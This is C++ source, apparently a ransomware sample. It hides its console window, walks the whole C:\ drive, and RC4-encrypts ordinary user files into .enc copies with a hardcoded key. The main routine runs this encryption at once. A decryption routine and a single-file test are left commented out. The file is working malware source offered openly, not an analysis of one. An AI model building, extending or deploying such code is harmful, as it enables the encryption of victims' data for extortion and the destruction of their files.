// Ransomeware_sample.cpp : 콘솔 응용 프로그램에 대한 진입점을 정의합니다.
//

#include "stdafx.h"
#include "CALG_RC4.h"

#include <Windows.h>
#include <shlwapi.h>
#include <locale.h>
#include <WinUser.h>


#pragma comment(lib,"shlwapi.lib")
#pragma comment(lib,"User32.lib")

void hideWindow(int opt)
{
	ShowWindow(GetConsoleWindow(), opt);
}


void findAllfile(TCHAR *startDir)
{
	setlocale(LC_ALL, "");
	CCALG_RC4 crypto;

	TCHAR tDirName[MAX_PATH] = { 0, };
	WIN32_FIND_DATA file;

	PathCombine(tDirName, startDir, L"*");

	HANDLE hFile = FindFirstFile(tDirName, &file);
	if (hFile != INVALID_HANDLE_VALUE) 
	{
		do 
		{
			if ( _tcsncmp(file.cFileName, L".", 1) == 0 || _tcsncmp(file.cFileName, L"..", 2) == 0)
				continue;
			
			if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
			{
				PathCombine(tDirName, startDir, file.cFileName);
				findAllfile(tDirName);
			}
			// check extension
			if (PathMatchSpec(file.cFileName, L"*.chm") || PathMatchSpec(file.cFileName, L"*.ini") || PathMatchSpec(file.cFileName, L"*.tmp") ||
				PathMatchSpec(file.cFileName, L"*.log") || PathMatchSpec(file.cFileName, L"*.url") || PathMatchSpec(file.cFileName, L"*.lnk") ||
				PathMatchSpec(file.cFileName, L"*.cmd") || PathMatchSpec(file.cFileName, L"*.bat") || PathMatchSpec(file.cFileName, L"*.scr") ||
				PathMatchSpec(file.cFileName, L"*.msi") || PathMatchSpec(file.cFileName, L"*.sys") || PathMatchSpec(file.cFileName, L"*.dll") || 
				PathMatchSpec(file.cFileName, L"*.exe")) 
			{
				continue;
			}
			else if (file.dwFileAttributes & FILE_ATTRIBUTE_READONLY || file.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM)
			{
				continue;
			}

			// encryption file
			TCHAR tOriFilePath[MAX_PATH] = { 0, };
			TCHAR tEncFilePath[MAX_PATH] = { 0, };
			PathCombine(tOriFilePath, startDir, file.cFileName);
			wsprintf(tEncFilePath, L"%s.enc", tOriFilePath);

			if (file.nFileSizeLow >  0) 
			{
				// do encryption file
				crypto.DoEncryptFile(tOriFilePath, tEncFilePath, L"Aw3s0m3Sc0t7");
				//_tprintf(L"File: %s\nEncd: %s\n", tOriFilePath, tEncFilePath);
			}

			/*
			// for decrypt
			TCHAR tOriFilePath[MAX_PATH] = { 0, };
			TCHAR tEncFilePath[MAX_PATH] = { 0, };
			PathCombine(tEncFilePath, startDir, file.cFileName);
			_tcscpy(tOriFilePath, tEncFilePath); // tEncFilePath is store *.enc file
			PathRemoveExtension(tOriFilePath); // remove .enc extension to restore orignal file
			if (file.nFileSizeLow)
			{
				crypto.DoDecryptFile(tEncFilePath, tOriFilePath, L"Aw3s0m3Sc0t7");
			}
			*/

		} while (FindNextFile(hFile, &file));
		FindClose(hFile);
	}
}

int main()
{
	int i = 0;
	hideWindow(0); // SH_HIDE(0), SH_RESTORE(9)
	findAllfile(L"C:\\");
	
	/*
	CCALG_RC4 crypto;
	crypto.DoEncryptFile(L"C:\\Users\\Scott\\Desktop\\test.pdf", 
		L"C:\\Users\\Scott\\Desktop\\test.enc", L"Aw3s0m3Sc0t7");
	
	getchar();
	crypto.DoDecryptFile(L"C:\\Users\\Scott\\Desktop\\test.enc",
		L"C:\\Users\\Scott\\Desktop\\dectest.pdf", L"Aw3s0m3Sc0t7");
	
	*/
    return 0;
}



int _tmain(int argc, _TCHAR* argv[])
{
	return 0;
}

